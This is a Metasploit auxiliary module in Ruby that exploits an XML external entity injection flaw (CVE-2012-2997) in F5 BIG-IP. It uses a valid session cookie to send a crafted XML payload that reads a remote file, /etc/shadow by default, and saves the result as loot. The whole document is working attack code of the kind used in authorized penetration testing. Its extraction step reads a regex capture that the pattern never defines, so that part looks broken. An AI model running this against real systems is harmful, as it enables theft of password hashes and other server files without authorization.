##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'         => 'F5 BIG-IP XML External Entity Injection Vulnerability',
			'Description'  =>  %q{
					This module attempts to read a remote file from the server using a
				vulnerability in the way F5 BIG-IP handles XML files. The vulnerability
				requires an authenticated cookie so you must have some access to the web
				interface. F5 BIG-IP versions from 10.0.0 to 11.2.1 are known to be vulnerabile,
				see F5 page for specific versions.
			},
			'References'   =>
				[
					[ 'CVE', '2012-2997' ],
					[ 'OSVDB', '89447' ],
					[ 'BID', '57496' ],
					[ 'URL', 'https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130122-0_F5_BIG-IP_XML_External_Entity_Injection_v10.txt' ], # Original disclosure
					[ 'URL', 'http://support.f5.com/kb/en-us/solutions/public/14000/100/sol14138.html'],
					[ 'URL', 'https://www.neg9.org' ] # General
				],
			'Author'       =>
				[
					'S. Viehbock', # Vulnerability discovery
					'Thaddeus Bogner', # Metasploit module
					'Will Caput', # Metasploit module
				],
			'DisclosureDate' => 'Jan 22 2013',
			'License'      => MSF_LICENSE
		)

		register_options(
		[
			Opt::RPORT(443),
			OptString.new('TARGETURI', [true, 'Path to F5 BIG-IP', '/sam/admin/vpe2/public/php/server.php']),
			OptString.new('RFILE', [true, 'Remote File', '/etc/shadow']),
			OptString.new('VALIDCOOKIE', [true, 'BIGIPAuthCookie value', '']),
			OptBool.new('SSL', [ true,  "Use SSL", true ])

		], self.class)

		register_autofilter_ports([ 443 ])
		deregister_options('RHOST')
	end

	def rport
		datastore['RPORT']
	end

	def run_host(ip)
		uri = normalize_uri(target_uri.path)
		res = send_request_cgi({
			'uri'     => uri,
			'method'  => 'GET'})

		if not res
			print_error("#{rhost}:#{rport} Unable to connect")
			return
		end

		accessfile(ip)
	end

	def accessfile(rhost)

		uri = normalize_uri(target_uri.path)
		print_status("#{rhost}:#{rport} Connecting to F5 BIG-IP Interface")

		entity = Rex::Text.rand_text_alpha(rand(4) + 4)

		data =  "<?xml  version=\"1.0\" encoding='utf-8' ?>" + "\r\n"
		data << "<!DOCTYPE a [<!ENTITY #{entity} SYSTEM '#{datastore['RFILE']}'> ]>" + "\r\n"
		data << "<message><dialogueType>&#{entity};</dialogueType></message>" + "\r\n"



		res = send_request_cgi({
				'uri'      => uri,
				'method'   => 'POST',
				'ctype'    => 'text/xml; charset=UTF-8',
				'cookie'  => "BIGIPAuthCookie=#{datastore['VALIDCOOKIE']}",
				'data'     => data,
				})

		if res and res.code == 200
			case res.body
			when /has sent unknown dialogueType/
				loot = $1
				if not loot or loot.empty?
					print_status("#{rhost}:#{rport} Retrieved empty file from #{rhost}:#{rport}")
					return
				end
				f = ::File.basename(datastore['RFILE'])
				path = store_loot('f5.bigip.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
				print_status("#{rhost}:#{rport} F5 BIG-IP - #{datastore['RFILE']} saved in #{path}")
				return
			end
		end
		print_error("#{rhost}:#{rport} Failed to retrieve file from #{rhost}:#{rport}")
	end

end
